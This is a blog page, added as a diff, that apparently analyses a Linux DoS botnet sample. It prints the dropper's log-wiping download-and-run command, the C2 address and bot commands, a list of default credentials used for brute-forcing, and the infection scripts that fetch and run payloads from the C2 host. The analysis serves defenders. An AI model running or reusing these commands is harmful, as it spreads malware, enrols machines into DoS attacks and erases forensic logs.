@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="pt">
+
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
+    <title>b08f9dc5784532be5b3f695f37c7781b | Fakhri Zulkifli</title>
+
+    <!-- Bootstrap -->
+    <link rel="stylesheet" href="/css/bootstrap-3.3.6/css/bootstrap.min.css">
+    <link rel="stylesheet" href="/css/main.css">
+
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+          <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+          <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+        <![endif]-->
+
+    <script>
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', 'UA-69613510-1', 'auto');
+    ga('send', 'pageview');
+
+</script>
+
+
+    <link rel="shortcut icon" href="/images/favicon.jpg">
+</head>
+
+
+    <body>
+      <div class="container">
+
+        <header class="row">
+  <div class="col-lg-8 col-lg-offset-2">
+    <h1 class="">Fakhri Zulkifli</h1>
+    <p>
+    <div align="center">
+    <a href="https://github.com/fakhrizulkifli" target="_blank"><span class="string">https://github.com/fakhrizulkifli</a>
+    •
+    <a href="https://twitter.com/d0lph1n98" target="_blank"><span class="string">https://twitter.com/d0lph1n98</a>
+    </div>
+    </p>
+  </div>
+</header>
+
+<div class="row">
+  <div class="col-lg-8 col-lg-offset-2">
+    <div class="menu">
+      <ul>
+          <li><a href="/">home</a></li>
+          <li><a href="/blog/">blog</a></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+
+
+        <div class="row">
+          <div class="col-lg-8 col-lg-offset-2">
+            <main>
+            <div class="post">
+
+  <header class="post-header">
+    <h1>b08f9dc5784532be5b3f695f37c7781b</h1>
+  </header>
+
+  <article class="post-content">
+  <div class="post">
+
+  <header class="post-header">
+    <p class="meta">
+        Sep 6, 2018
+        
+        
+    </p>
+  </header>
+
+  <article class="post-content">
+  <p>Initial file dropped:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>clear ; unset ; rm -rf /var/run/utmp /var/log/wtmp /var/log/lastlog /var/log/messages /var/log/secure /var/log/xferlog /var/log/maillog /root/.bash_history ; unset HISTFILE ; unset HISTSAVE ; unset HISTLOG ; history -n ; unset WATCH ; export HISTFILE=/dev/null ; wget keedz.tk/client ; chmod +x client ; ./client ; rm -rf client ; rm -rf bash_history ; export HISTFILE=/dev/null ; rm -rf botz.sh ; exit
+</code></pre></div></div>
+
+<p>The <code class="highlighter-rouge">client</code> is a 64-bit ELF binary. The binary acts as a DoS bot which connect to their CNC (5.135.209.121) on port 23.</p>
+
+<p>Available commands:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GETLOCALIP
+SCANNER ON | OFF
+HOLD
+JUNK
+HTTP
+COMBO
+KILLATTK
+FUCKOFF
+</code></pre></div></div>
+
+<p>Below is the connection to the CNC:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Trying 5.135.209.121...
+Connected to ip121.ip-5-135-209.eu.
+Escape character is '^]'.
+!* SCANNER ON
+PING
+PONG
+</code></pre></div></div>
+
+<p>If you try to connect for the 2nd time, this will be output.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Trying 5.135.209.121...
+Connected to ip121.ip-5-135-209.eu.
+Escape character is '^]'.
+!* LOLNOGTFO
+Connection closed by foreign host.
+</code></pre></div></div>
+
+<p>However, the CNC can be connected again after a few seconds.</p>
+
+<p>The binary spread by bruteforcing the login for a random IP addresses.</p>
+
+<p>List of usernames:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root
+admin
+user
+login
+guest
+support
+</code></pre></div></div>
+<p>List of passwords:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root
+toor
+admin
+user
+guest
+login
+changeme
+1234
+12345
+123456
+default
+password
+support
+</code></pre></div></div>
+
+<p>Once logged in, it will execute the following commands:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 5.135.209.121 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 5.135.209.121; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 23 5.135.209.121 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *; exit
+</code></pre></div></div>
+
+<p>Inside bins.sh, more binary will be fetch</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-e #!/bin/bash
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/sshd; chmod +x sshd; ./sshd; rm -rf sshd
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/openssh; chmod +x openssh; ./openssh; rm -rf openssh
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/bash; chmod +x bash; ./bash; rm -rf bash
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/tftp; chmod +x tftp; ./tftp; rm -rf tftp
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/wget; chmod +x wget; ./wget; rm -rf wget
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/cron; chmod +x cron; ./cron; rm -rf cron
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/ftp; chmod +x ftp; ./ftp; rm -rf ftp
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/pftp; chmod +x pftp; ./pftp; rm -rf pftp
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/sh; chmod +x sh; ./sh; rm -rf sh
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/' '; chmod +x ' '; ./' '; rm -rf ' '
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/apache2; chmod +x apache2; ./apache2; rm -rf apache2
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
+</code></pre></div></div>
+
+  </article>
+
+  <div id="disqus_thread"></div>
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES * * */
+    var disqus_shortname = '';
+    var disqus_config = function () {
+        this.page.identifier = "/b08f9dc5784532be5b3f695f37c7781b/";
+    };
+    
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+
+
+
+</div>
+
+  </article>
+
+</div>
+
+            </main>
+          </div>
+        </div>
+
+        <div class="row">
+  <div class="col-lg-8 col-lg-offset-2">
+    <footer>
+      
+    </footer>
+  </div>
+</div>
+
+
+      </div>
+    </body>
+</html>
